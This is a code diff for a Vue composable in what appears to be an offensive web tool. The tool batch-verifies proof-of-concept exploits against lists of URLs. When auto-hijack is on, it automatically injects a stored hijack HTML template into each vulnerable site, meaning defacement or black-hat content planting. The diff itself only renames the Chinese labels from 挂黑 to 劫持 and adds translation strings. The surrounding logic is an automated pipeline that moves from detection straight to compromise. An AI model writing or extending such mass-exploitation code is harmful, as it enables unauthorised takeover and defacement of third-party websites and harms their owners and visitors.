@@ -3,6 +3,7 @@
  * 负责批量 POC 验证逻辑
  */
 import { ref, nextTick, unref } from 'vue'
+import { useI18n } from 'vue-i18n'
 
 export function useBatchVerify(
   batchSettings,
@@ -11,6 +12,7 @@ export function useBatchVerify(
   totalPages,
   autoHijackEnabled
 ) {
+  const { t } = useI18n()
   const batchVerifying = ref(false)
   const batchVerifyPaused = ref(false)
   const batchVerifyStats = ref({
@@ -126,10 +128,10 @@ export function useBatchVerify(
     }
   }
 
-  // 执行挂黑
+  // 执行劫持
   const executeHijack = async (url, settings) => {
     try {
-      // 加载批量挂黑模板（独立于 POC 挂黑模板）
+      // 加载批量劫持模板（独立于 POC 劫持模板）
       const result = await window.api.storage.loadSettings()
       let hijackHtml = ''
 
@@ -149,14 +151,14 @@ export function useBatchVerify(
       const hijackResult = await window.api.executePOC(url, command)
 
       if (hijackResult.success && hijackResult.data.is_vulnerable) {
-        console.log('✓ 挂黑成功:', url)
+        console.log('✓ 劫持成功:', url)
         return true
       } else {
-        console.error('✗ 挂黑失败:', url, hijackResult.error)
+        console.error('✗ 劫持失败:', url, hijackResult.error)
         return false
       }
     } catch (error) {
-      console.error('挂黑错误:', error)
+      console.error('劫持错误:', error)
       return false
     }
   }
@@ -330,30 +332,30 @@ export function useBatchVerify(
             batchVerifyStats.value.vulnerable++
             await addToVulnHistory(item.fullUrl)
 
-            console.log('[批量挂黑] 检测到漏洞:', item.fullUrl)
-            console.log('[批量挂黑] autoHijackEnabled:', unref(autoHijackEnabled))
+            console.log('[批量劫持] 检测到漏洞:', item.fullUrl)
+            console.log('[批量劫持] autoHijackEnabled:', unref(autoHijackEnabled))
 
-            // 如果启用了自动挂黑，等待1秒后执行挂黑
+            // 如果启用了自动劫持，等待1秒后执行劫持
             if (unref(autoHijackEnabled)) {
-              console.log('[批量挂黑] 开始挂黑流程...')
+              console.log('[批量劫持] 开始劫持流程...')
               // 等待1秒
               await new Promise((resolve) => setTimeout(resolve, 1000))
 
-              // 显示正在挂黑状态
+              // 显示正在劫持中状态
               item.pocStatus = 'hijacking'
 
-              // 执行挂黑
+              // 执行劫持
               const hijackSuccess = await executeHijack(item.fullUrl, batchSettings.value)
               if (hijackSuccess) {
                 item.pocStatus = 'hijacked'
                 batchVerifyStats.value.hijacked++
-                // 漏洞数减1（因为已经挂黑了）
+                // 漏洞数减1（因为已经劫持了）
                 batchVerifyStats.value.vulnerable--
-                console.log('✓ 自动挂黑成功:', item.fullUrl)
+                console.log('✓ 自动劫持成功:', item.fullUrl)
               } else {
                 item.pocStatus = 'hijack-failed'
                 batchVerifyStats.value.hijackFailed = (batchVerifyStats.value.hijackFailed || 0) + 1
-                console.log('✗ 自动挂黑失败:', item.fullUrl)
+                console.log('✗ 自动劫持失败:', item.fullUrl)
               }
             }
           } else if (result.command_failed || !result.is_vulnerable) {
@@ -472,13 +474,13 @@ export function useBatchVerify(
       hijackFailed: 0
     }
 
-    showSnackbar('开始批量验证...', 'info')
+    showSnackbar(t('batch.verifying'), 'info')
     const result = await executeBatchVerify(loadPageData)
     if (result) {
       if (result.success) {
         showSnackbar(result.message, 'success')
       } else {
-        showSnackbar('批量验证出错: ' + result.error, 'error')
+        showSnackbar(`${t('messages.operationFailed')}: ${result.error}`, 'error')
       }
     }
   }
@@ -489,7 +491,7 @@ export function useBatchVerify(
     batchVerifyPaused.value = true
     isChangingPage.value = false // 重置标志
     clearHighlightedRow()
-    showSnackbar('批量验证已暂停', 'info')
+    showSnackbar(t('messages.operationSuccess'), 'info')
   }
 
   // 继续批量验证
@@ -497,13 +499,13 @@ export function useBatchVerify(
     batchVerifyPaused.value = false
     batchVerifying.value = true
     isChangingPage.value = false // 重置标志
-    showSnackbar('继续批量验证...', 'info')
+    showSnackbar(t('batch.verifying'), 'info')
     const result = await executeBatchVerify(loadPageData)
     if (result) {
       if (result.success) {
         showSnackbar(result.message, 'success')
       } else {
-        showSnackbar('批量验证出错: ' + result.error, 'error')
+        showSnackbar(`${t('messages.operationFailed')}: ${result.error}`, 'error')
       }
     }
   }
